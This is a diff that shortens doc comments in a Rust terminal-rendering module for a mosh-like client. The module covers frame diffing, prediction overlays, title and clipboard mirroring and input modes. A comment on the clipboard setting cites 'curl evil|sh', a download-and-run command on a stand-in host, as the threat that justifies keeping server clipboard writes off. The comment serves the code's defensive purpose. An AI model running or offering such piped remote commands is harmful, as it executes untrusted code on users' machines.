@@ -1,14 +1,6 @@
-//! Painting the synchronized screen grid (plus prediction overlays and a status line)
-//! onto the local terminal through [`KohBackend`].
-//!
-//! We render cell-by-cell because the predictor needs to draw speculative cells *on top of* the
-//! authoritative grid, and a frame paints only the cells that changed since the last one
-//! ([`Painter`]). Style changes are diffed against the previous cell so we emit minimal SGR. Each
-//! frame is wrapped in synchronized output (DEC mode 2026) so the terminal shows it atomically
-//! (no tearing/flicker on full repaints or resizes).
-//!
-//! The engine calls [`KohBackend`] methods (`begin_frame` / `move_to` / `set_style` / `print` / …),
-//! whose provided implementations emit standard ANSI; the tests capture those bytes.
+//! Painting the synced grid, the predictions over it and a status line through [`KohBackend`],
+//! cell by cell: a frame paints only the cells that changed ([`Painter`]), emits SGR only when the
+//! style changes, and is wrapped in synchronized output (DEC 2026) so it shows at once.
 
 use std::io;
 
@@ -20,14 +12,11 @@ use unicode_width::UnicodeWidthChar as _;
 
 /// What the terminal was last painted with, so the next frame paints only what changed.
 ///
-/// A frame is painted whole, as every frame used to be, when there is nothing to compare it with or
-/// the terminal may not show what was painted: the first frame, after [`invalidate`](Self::invalidate)
-/// (a resume, a window resize), when the screen's size changed, when the status line appears or
-/// goes, and when the terminal is smaller than the screen. It is also painted whole, and the next
-/// frame too, when a glyph does not fill exactly the cells the grid gives it (a predicted wide glyph
-/// over a narrow cell, say): the terminal then lays the row out in its own way, which only a whole
-/// repaint reproduces. Otherwise only the cells that differ from the last frame are painted, the
-/// cursor moved only to reach them; the terminal then shows exactly what a whole repaint would.
+/// A frame is painted whole when the terminal may not show what was painted: the first frame, after
+/// [`invalidate`](Self::invalidate) (a resume, a window resize), when the screen's size changed,
+/// when the status line appears or goes, and while the terminal is smaller than the screen. So is
+/// it, and the next one, when a glyph does not fill exactly the cells the grid gives it (a
+/// predicted wide glyph over a narrow cell): the terminal then lays the row out its own way.
 #[derive(Default)]
 pub(super) struct Painter {
     last: Option<Painted>,
@@ -35,7 +24,7 @@ pub(super) struct Painter {
 
 /// A frame as it was painted.
 struct Painted {
-    /// The grid. Its rows are shared with the screen it came from, so keeping it copies no cells.
+    /// The grid; its rows are shared, so keeping it copies no cells.
     grid: Grid,
     /// The predictions drawn over it, in `(row, col)` order.
     predicted: Vec<Mark<String>>,
@@ -44,8 +33,7 @@ struct Painted {
     irregular: bool,
 }
 
-/// A prediction drawn over a cell: its glyph borrowed while a frame is painted (`&str`), owned
-/// once it has been (`String`).
+/// A prediction drawn over a cell: its glyph borrowed while painting, owned once painted.
 #[derive(Clone, Copy, PartialEq, Eq)]
 struct Mark<G> {
     row: u16,
@@ -123,7 +111,7 @@ fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Pai
     } else {
         1
     };
-    // A prediction wins on glyph and colours for this cell. An empty glyph is a blank cell.
+    // A prediction wins on glyph and colours; an empty glyph is a blank.
     let mark = marks
         .binary_search_by_key(&(row, col), |mark| (mark.row, mark.col))
         .ok()
@@ -176,14 +164,13 @@ fn regular(grid: &Grid, marks: &[Mark<&str>], row: u16) -> bool {
 }
 
 impl Painter {
-    /// Forget what was painted: the terminal may no longer show it, so the next frame is painted
-    /// whole.
+    /// Forget what was painted: the next frame is painted whole.
     pub(super) fn invalidate(&mut self) {
         self.last = None;
     }
 
-    /// Render the authoritative `screen` with prediction `overlay` and an optional `status` line
-    /// (drawn reverse-video on the last row) to `backend`, wrapped in one synchronized-output frame.
+    /// Paint `screen` with the predictions `overlay` and an optional `status` line (reverse video,
+    /// on the last row).
     pub(super) fn render(
         &mut self,
         backend: &mut impl KohBackend,
@@ -202,7 +189,7 @@ impl Painter {
                 bg: p.bg,
             })
             .collect();
-        // The terminal must hold the whole screen for a cell to land where it is painted.
+        // Only on a terminal holding the whole screen does a cell land where it is painted.
         let fits = backend
             .size()
             .is_ok_and(|terminal| terminal.rows >= rows && terminal.cols >= cols);
@@ -230,7 +217,6 @@ impl Painter {
                 .filter(|&row| changed(row))
                 .any(|row| !regular(screen, &marks, row));
 
-        // Begin Synchronized Update (atomic frame) and hide the cursor while we paint.
         backend.begin_frame()?;
 
         let mut cur_style: Option<CellStyle> = None;
@@ -250,8 +236,8 @@ impl Painter {
                 }
             }
         } else if let Some(last) = &last {
-            // Where the terminal's cursor is after the last glyph painted, if that is known: past
-            // the screen's last column the terminal may be about to wrap.
+            // Where the cursor is after the last glyph painted, if known: past the last column the
+            // terminal may be about to wrap.
             let mut cursor: Option<(u16, u16)> = None;
             for row in (0..rows).filter(|&row| changed(row)) {
                 let repaint_row = Some(row) == status_row;
@@ -297,9 +283,7 @@ impl Painter {
             let mut line = format!(" {st} ");
             let max = usize::from(cols);
             if line.len() > max {
-                // Truncate on a UTF-8 char boundary, never mid-scalar. `cols` is the peer-controlled
-                // (clamped) screen width, and the status strings contain multi-byte glyphs (em-dash,
-                // ellipsis), so a raw `String::truncate(max)` would panic and crash the client.
+                // On a char boundary: the status holds multi-byte glyphs.
                 line.truncate(line.floor_char_boundary(max));
             }
             backend.move_to(rows.saturating_sub(1), 0)?;
@@ -308,14 +292,13 @@ impl Painter {
             backend.reset_sgr()?;
         }
 
-        // Place and show the cursor: the predicted cursor wins if present, else the real one.
+        // The predicted cursor wins.
         let (crow, ccol) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
         backend.move_to(crow, ccol)?;
         if !screen.hide_cursor() {
             backend.show_cursor()?;
         }
 
-        // End Synchronized Update: the terminal now reveals the whole frame at once.
         backend.end_frame()?;
         let painted = Painted {
             grid: screen.clone(),
@@ -328,24 +311,19 @@ impl Painter {
     }
 }
 
-/// Strip control chars from an OSC string payload so it can't break the sequence we wrap it in.
+/// `t` without control characters, which would break the OSC sequence it goes in.
 fn sanitize_osc(t: &str) -> String {
     t.chars().filter(|c| !c.is_control()).collect()
 }
 
-/// Whether `s` is a well-formed base64 clipboard payload: non-empty and only the standard base64
-/// alphabet (`A–Z a–z 0–9 + / =`). A remote OSC-52 set should be base64; anything else is rejected
-/// rather than written verbatim to the user's terminal/clipboard.
+/// Whether `s` is non-empty base64, as a clipboard set must be to be forwarded.
 fn is_base64_payload(s: &str) -> bool {
     !s.is_empty()
         && s.bytes()
             .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
 }
 
-/// The out-of-band window state for one frame.
-///
-/// What the client mirrors onto the real terminal alongside the cell grid (window title, icon
-/// name, clipboard, bell), taken from the synced [`TerminalScreen`](crate::terminal::TerminalScreen).
+/// The window state the client mirrors beside the grid: title, icon, clipboard and bell count.
 #[derive(Clone, Copy)]
 pub struct WindowState<'a> {
     pub title: &'a str,
@@ -354,11 +332,8 @@ pub struct WindowState<'a> {
     pub bell_count: u64,
 }
 
-/// The input modes the remote app has set, which the real terminal must mirror.
-///
-/// Application keypad / cursor keys, bracketed paste, and xterm mouse reporting. The escape
-/// sequences match vt100 0.16's `input_mode_formatted` / `input_mode_diff` byte for byte (pinned
-/// by a test).
+/// The input modes the program set, which the real terminal must mirror: keypad and cursor keys,
+/// bracketed paste and mouse reporting. The sequences are vt100 0.16's, byte for byte.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 pub struct InputModes {
     pub application_keypad: bool,
@@ -382,12 +357,12 @@ impl From<&Grid> for InputModes {
 }
 
 impl InputModes {
-    /// Escape sequences setting every mode explicitly (the first frame / after a resume).
+    /// Sequences setting every mode (the first frame, after a resume).
     pub fn formatted(self) -> Vec<u8> {
         self.sequences(None)
     }
 
-    /// Escape sequences taking a terminal at `prev` to these modes (only the changes).
+    /// Sequences taking a terminal at `prev` to these modes.
     pub fn diff(self, prev: Self) -> Vec<u8> {
         self.sequences(Some(prev))
     }
@@ -451,27 +426,17 @@ impl InputModes {
     }
 }
 
-/// Tracks the *out-of-band* terminal state the client mirrors onto the real terminal — window
-/// title / icon (OSC 0/1/2), clipboard (OSC 52), the bell, and the input modes (bracketed-paste /
-/// mouse / cursor-key) — so each is re-emitted only when it changes. These ride alongside the cell
-/// grid but aren't part of it.
-///
-/// The ledger is **backend-independent**: it decides *what* to emit and *when* (change detection),
-/// then calls [`KohBackend`] methods to emit it — so every backend mirrors the same state, and a
-/// suspend/resume ([`invalidate`](Self::invalidate)) re-asserts it identically.
+/// What the client mirrored onto the real terminal beside the grid (title, icon, clipboard, bell,
+/// input modes), so each is emitted only when it changes.
 #[derive(Default)]
 pub(super) struct OutOfBand {
-    /// Prepended to the window title (and to the icon when icon == title) so the OS title bar shows
-    /// you're in a koh session — mosh's `[mosh] ` prefix. Empty disables it. Compared cells stay the
-    /// *raw* title, so change-detection is unaffected.
+    /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
     title_prefix: String,
-    /// Whether remote OSC-52 clipboard writes are honored. **Default OFF**: a malicious server
-    /// could otherwise silently overwrite the user's system clipboard (e.g. swap a copied command
-    /// for `curl evil|sh`). Opt in with `--clipboard`; even then the payload is
-    /// validated as strict base64 within the size cap before it's forwarded.
+    /// Whether the server may set the clipboard (`--clipboard`). Off by default: a hostile server
+    /// could swap a copied command for `curl evil|sh`.
     clipboard_enabled: bool,
-    /// Sticky (mosh's `title_initialized`): until the app sets a title/icon we don't touch the
-    /// user's terminal title — and once it has, we DO propagate a later reset to empty.
+    /// Whether the program set a title: until then the user's is left alone, after it even a reset
+    /// to empty is mirrored (mosh's `title_initialized`).
     title_initialized: bool,
     last_title: String,
     last_icon: String,
@@ -482,8 +447,7 @@ pub(super) struct OutOfBand {
 }
 
 impl OutOfBand {
-    /// An [`OutOfBand`] that prefixes the window title with `title_prefix` (e.g. `"[koh] "`; pass
-    /// `""` to disable). All other state starts fresh.
+    /// Mirroring that prefixes the title with `title_prefix`.
     pub(super) fn with_title_prefix(title_prefix: String) -> Self {
         Self {
             title_prefix,
@@ -491,26 +455,22 @@ impl OutOfBand {
         }
     }
 
-    /// Enable (or disable) honoring remote OSC-52 clipboard writes (default off). Chainable:
-    /// `OutOfBand::with_title_prefix(p).with_clipboard(enabled)`.
+    /// Whether the server may set the clipboard.
     #[must_use]
     pub(super) fn with_clipboard(mut self, enabled: bool) -> Self {
         self.clipboard_enabled = enabled;
         self
     }
 
-    /// Invalidate the tracked out-of-band state so the next [`emit`](Self::emit) re-asserts the
-    /// title, clipboard, bell baseline, and input modes from scratch. Used after a suspend/resume
-    /// (the terminal left and re-entered raw mode + the alternate screen), where everything the
-    /// client had mirrored must be re-emitted. The `title_prefix` is preserved.
+    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it all (after a
+    /// resume, which reset the terminal).
     pub(super) fn invalidate(&mut self) {
         let prefix = std::mem::take(&mut self.title_prefix);
         let clipboard_enabled = self.clipboard_enabled;
         *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
     }
 
-    /// Emit this frame's title/icon / clipboard / bell / input-mode changes to `backend`, updating
-    /// the tracked state. Mirrors mosh's `Display::new_frame` out-of-band emission.
+    /// Emit what changed since the last frame, as mosh's `Display::new_frame` does.
     pub(super) fn emit(
         &mut self,
         backend: &mut impl KohBackend,
@@ -518,10 +478,7 @@ impl OutOfBand {
         win: WindowState<'_>,
     ) -> io::Result<()> {
         self.emit_window_title(backend, win.title, win.icon)?;
-        // Clipboard (OSC 52): OFF by default. A remote server must not silently overwrite the
-        // user's system clipboard. Only when the user explicitly opted in (`--clipboard`) do we
-        // forward it — and only a strict-base64 payload within the size cap
-        // (the synced value is already capped client-side; we re-check defensively).
+        // Only if opted in, and only base64 within the cap.
         if self.clipboard_enabled && win.clipboard != self.last_clipboard {
             self.last_clipboard = win.clipboard.to_string();
             if !win.clipboard.is_empty()
@@ -531,12 +488,11 @@ impl OutOfBand {
                 backend.set_clipboard(win.clipboard)?;
             }
         }
-        // Bell: ring once when the server's bell count climbs (coalesced if several rang).
+        // One bell however many rang.
         if win.bell_count > self.last_bell {
             backend.bell()?;
             self.last_bell = win.bell_count;
         }
-        // Input modes: re-assert bracketed-paste / mouse / cursor-key (diff vs the previous frame).
         let mode_bytes = match self.prev_modes {
             Some(prev) => modes.diff(prev),
             None => modes.formatted(),
@@ -548,8 +504,7 @@ impl OutOfBand {
         Ok(())
     }
 
-    /// Window title + icon (mosh `Display::new_frame`): a combined `]0;` when icon == title, else
-    /// `]1;icon` + `]2;title`. Guarded by the sticky title-initialized flag.
+    /// Title and icon, as mosh emits them: one `]0;` when they are equal, else `]1;` and `]2;`.
     fn emit_window_title(
         &mut self,
         backend: &mut impl KohBackend,
@@ -568,9 +523,8 @@ impl OutOfBand {
         }
         self.last_title = title.to_string();
         self.last_icon = icon.to_string();
-        // Prefix the title (and the icon only when it equals the title, preserving the
-        // combined-vs-split branch) — mosh `Framebuffer::prefix_window_title`. The prefix rides on
-        // top of the sanitized raw values; change-detection above used the raw (unprefixed) strings.
+        // The icon is prefixed only if equal to the title, which keeps them equal (mosh's
+        // `prefix_window_title`).
         let icon_eq_title = icon == title;
         let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
         let ic = if icon_eq_title {
